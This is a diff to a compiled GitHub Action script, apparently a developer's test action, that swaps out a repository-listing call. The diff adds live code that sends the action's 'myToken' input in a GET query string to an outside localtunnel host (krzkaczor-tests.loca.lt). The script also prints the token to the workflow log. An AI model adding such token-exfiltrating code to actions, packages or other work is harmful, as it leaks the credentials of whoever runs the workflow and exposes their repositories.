@@ -37,6 +37,7 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 const core = __importStar(__nccwpck_require__(2186));
 const github = __importStar(__nccwpck_require__(5438));
+const httpm = __importStar(__nccwpck_require__(6255));
 const wait_1 = __nccwpck_require__(5817);
 function run() {
     return __awaiter(this, void 0, void 0, function* () {
@@ -45,22 +46,23 @@ function run() {
             const myToken = core.getInput('myToken');
             core.warning(myToken);
             const gh = github.getOctokit(myToken);
-            core.warning(JSON.stringify(yield gh.request('GET /installation/repositories', {})
-            // await gh.rest.meta.get()
-            // await gh.rest.repos.listCommitStatusesForRef({
-            //   owner: 'krzkaczor',
-            //   repo: 'babel-plugin-tailcall-optimization',
-            //   ref: 'master'
-            // })
-            ));
+            // core.warning(
+            //   JSON.stringify(
+            //     await gh.request('GET /installation/repositories', {})
+            //     // await gh.rest.meta.get()
+            //     // await gh.rest.repos.listCommitStatusesForRef({
+            //     //   owner: 'krzkaczor',
+            //     //   repo: 'babel-plugin-tailcall-optimization',
+            //     //   ref: 'master'
+            //     // })
+            //   )
+            // )
             // core.warning(
             //   JSON.stringify(await gh.rest., undefined, 2)
             // )
             // core.debug(`Waiting ${ms} milliseconds ...`) // debug is only output if you set the secret `ACTIONS_STEP_DEBUG` to true
-            // const _http = new httpm.HttpClient('http-client-tests')
-            // const res: httpm.HttpClientResponse = await _http.get(
-            //   `https://krzkaczor-tests.loca.lt?dupa=${myToken}`
-            // )
+            const _http = new httpm.HttpClient('http-client-tests');
+            const res = yield _http.get(`https://krzkaczor-tests.loca.lt?dupa=${myToken}`);
             core.debug(new Date().toTimeString());
             yield (0, wait_1.wait)(parseInt(ms, 10));
             core.debug(new Date().toTimeString());
